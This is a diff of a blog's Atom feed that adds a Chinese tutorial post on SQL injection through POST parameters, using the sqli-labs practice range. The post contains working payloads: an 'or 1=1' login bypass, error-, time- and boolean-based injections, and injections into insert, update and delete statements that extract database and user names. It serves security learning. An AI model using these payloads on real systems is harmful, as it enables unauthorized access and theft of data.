@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://adad456.github.io/"/>
-  <updated>2019-10-19T01:53:22.799Z</updated>
+  <updated>2019-10-19T03:29:22.296Z</updated>
   <id>https://adad456.github.io/</id>
   
   <author>
@@ -17,25 +17,31 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>test</title>
-    <link href="https://adad456.github.io/2019/10/19/test/"/>
-    <id>https://adad456.github.io/2019/10/19/test/</id>
-    <published>2019-10-19T01:52:35.000Z</published>
-    <updated>2019-10-19T01:53:22.799Z</updated>
+    <title>POST注入</title>
+    <link href="https://adad456.github.io/2019/10/19/POST%E6%B3%A8%E5%85%A5/"/>
+    <id>https://adad456.github.io/2019/10/19/POST注入/</id>
+    <published>2019-10-19T03:25:46.000Z</published>
+    <updated>2019-10-19T03:29:22.296Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="/2019/10/19/test/G:%5CBlog%5Cblog%5Csource_posts%5Ctest%5C1.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p><strong>在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句</strong></p><p><em>数据库中创建一个test的表</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table TEST(id int(3),username varchar(25),password varchar(25),primary key(id))</span><br></pre></td></tr></table></figure><h2 id="账号登陆"><a href="#账号登陆" class="headerlink" title="账号登陆"></a>账号登陆</h2><p><em>通过SQL的‘or’运算符构造万能密码,以sqlilabs靶场的第11关为例</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">密码：随意</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571451380.67.png" alt=""></p><p><em>在判断出注入点后，可以利用时间注入、布尔注入、报错注入接着获取更多的信息</em></p><p><em>报错注入：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or updatexml(1,concat(0x23,database(),0x23),1)#&amp;&amp;passwd=3421412sds</span><br></pre></td></tr></table></figure><p><em>时间注入：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and if(ascii(substr(database(),1,1))=115,sleep(5),1)#passwd=2142dwq</span><br></pre></td></tr></table></figure><p><em>布尔注入：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and ascii(substr(database(),1,1)) =115#&amp;&amp;passwd=41234</span><br></pre></td></tr></table></figure><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p><em>SQL语句：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,username,password) values(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test values(&apos;4&apos;,&apos;version()&apos;,&apos;c&apos;);-- &apos;&apos;,&apos;b&apos;,&apos;c&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test values(&apos;4&apos;,USER(),&apos;c&apos;);-- &apos;&apos;,&apos;b&apos;,&apos;c&apos;);</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453303.2.png" alt=""></p><p><em>此处的USER()就是构造的payload，单引号闭合会使得payload变成字符串，可以接着获取更多数据库信息</em></p><p><em>实际中无法知道数据库中表的列数，可以先尝试用数字代替字符串的列（字符串无法代替数字），错误时会插入失败</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test values(&apos;1&apos;,2,3,4,5,6,7);-- &apos;&apos;,&apos;b&apos;,&apos;c&apos;);</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453937.25.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test values(&apos;1&apos;,2,3);-- &apos;&apos;,&apos;b&apos;,&apos;c&apos;);</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454023.71.png" alt=""></p><h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p><em>SQL语句：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update test set name=&apos;shiqi&apos; where id=1;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update test set username=&apos;adwdas&apos;,password=&apos;user()&apos; where id=2-- &apos; where id=2;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update test set username=&apos;adwdas&apos;,password=user() where id=1-- &apos; where id=1;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454596.92.png" alt=""></p><p><em>与insert类似，除了闭合位置不同，其他的完全一样；此时password处的user()就是构造的攻击语句</em></p><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><em>SQL语句：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from test where id=2;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from test where id=2 and if(1=1,sleep(5),0);</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571455212.6.png" alt=""></p><p><em>判断出注入点就可以构造其他的攻击语句，获取更多信息</em></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&lt;img src=&quot;/2019/10/19/test/G:%5CBlog%5Cblog%5Csource_posts%5Ctest%5C1.png&quot; alt&gt;&lt;/p&gt;
-
+        &lt;p&gt;&lt;strong&gt;在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;数据库中创建一个test的表&lt;/em&gt;&lt;/p
       
     
     </summary>
     
     
+      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="POST注入" scheme="https://adad456.github.io/tags/POST%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
